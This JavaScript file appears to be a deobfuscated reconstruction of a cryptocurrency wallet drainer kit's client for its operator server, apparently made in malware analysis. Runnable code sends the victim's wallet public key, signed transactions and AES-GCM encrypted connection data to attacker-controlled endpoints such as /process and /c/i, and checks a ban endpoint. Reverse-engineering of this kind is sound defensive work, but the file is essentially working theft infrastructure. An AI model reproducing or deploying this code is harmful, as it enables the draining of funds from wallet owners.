/**
 * Operator HTTP client (original class 听, instance 夾).
 *
 * Base URL is https://{apiHost}/api + path. apiHost is state.Se, a hostname,
 * not a wallet address and not the Jupiter key ab060a03-... .
 *
 * POST encoding (original function 壩): a Uint8Array body is sent as
 * STANDARD base64 (Uint8Array.prototype.toBase64, polyfilled by the kit
 * when missing) with content-type text/plain. Anything else is sent as
 * JSON with content-type application/json. The kit's custom-base64
 * decoder inside 壩 (磕) only decodes selected string-table entries
 * (e.g. "application/json"); it is not used on request bodies.
 *
 * Payload builders live in payloads.js:
 *   yn   body = buildProcessPayload(victim, attemptCounter, signedTxs, he.be, he.Fe)
 *   On   body = AES-GCM(buildConnectPayload(victim, state.K, he.lr)), key purpose apiHost+"c"
 *   Nn   body = packByteArrays(items)
 *
 * Paths recovered from fixed string indexes:
 *   bn  GET  /locales?lang={lang}     localized UI strings
 *   Tn  GET  /is-banned                body "1" means banned
 *   yn  POST /process                  signed-transaction submit, 2.5s
 *   On  POST /c/i                      connect notification, 16s
 *   Ao  POST /c/c/{a}/{b}              confirm notification, 16s
 *   Nn  POST /c/f/{a}                  final notification, 2.5s
 *
 * zt retries a call (the submit path wraps yn in it). Ft builds the URL.
 * 濱 is the HTTP status error.
 */

class OperatorClient {
  url(state, path) {
    // Ft
    return "https://" + state.apiHost + "/api" + path;
  }

  async locales(state, lang) {
    // bn; GET helper 饱 appends an optional query string
    const response = await fetch(this.url(state, "/locales?lang=" + lang), {
      signal: AbortSignal["Be"](2500),
    });
    if (!response.ok) throw new StatusError(response.status);
    return response.json();
  }

  async isBanned(state) {
    // Tn
    const response = await fetch(this.url(state, "/is-banned"), {
      signal: AbortSignal["Be"](2500),
    });
    if (!response.ok) throw new StatusError(response.status);
    return (await response.text()) === "1";
  }

  async submitSigned(state, attemptCounter, signedTransactions) {
    // yn
    const body = buildProcessPayload(
      state.b.e,                              // victim wallet pubkey
      attemptCounter,                         // global 屭.ne, 0 when unset
      signedTransactions,                     // array of Uint8Array
      state.he.be,                            // flow type byte
      state.he.Fe.map((a) => (a.type === 0 ? a.de : a.e)),
    );
    const response = await this._post(state.c, "/process", body, 2500);
    if (!response.ok) throw new StatusError(response.status);
  }

  async notifyConnect(state) {
    // On
    const plaintext = buildConnectPayload(state.b.e, state.K, state.he.lr);
    const body = await encryptForOperator(plaintext, state.c.Se + "c");
    const response = await this._post(state.c, "/c/i", body, 16000);
    if (!response.ok) throw new StatusError(response.status);

    // Binary response, parsed by 籮: a 32-byte session key (read as a
    // base58 pubkey), a u16 length, and a length-prefixed UTF-8 string.
    // The middle element is optional; On reshapes it to {key: csv.split(",")}.
    const buffer = new Uint8Array(await response.arrayBuffer());
    const [session, keyAndCsv, extra] = parseConnectResponse(buffer);
    let keyed;
    if (keyAndCsv) {
      const [key, csv] = keyAndCsv;
      keyed = { [key]: csv.split(",") };
    }
    return [session, keyed, extra];
  }

  async notifyConfirm(state, a, b) {
    // Ao; posts an empty JSON object
    const response = await this._post(state, "/c/c/" + a + "/" + b, {}, 16000);
    if (!response.ok) throw new StatusError(response.status);
  }

  async notifyFinal(state, a, items) {
    // Nn
    const body = packByteArrays(items);
    const response = await this._post(state, "/c/f/" + a, body, 2500);
    if (!response.ok) throw new StatusError(response.status);
  }

  // 壩: base64-text/plain for bytes, JSON for objects.
  async _post(state, path, body, timeoutMs) {
    const [payload, contentType] =
      body instanceof Uint8Array
        ? [body.toBase64(), "text/plain"]
        : [JSON.stringify(body), "application/json"];
    return fetch(this.url(state, path), {
      headers: { "content-type": contentType },
      signal: AbortSignal["Be"](timeoutMs),
      body: payload,
      method: "POST",
    });
  }
}

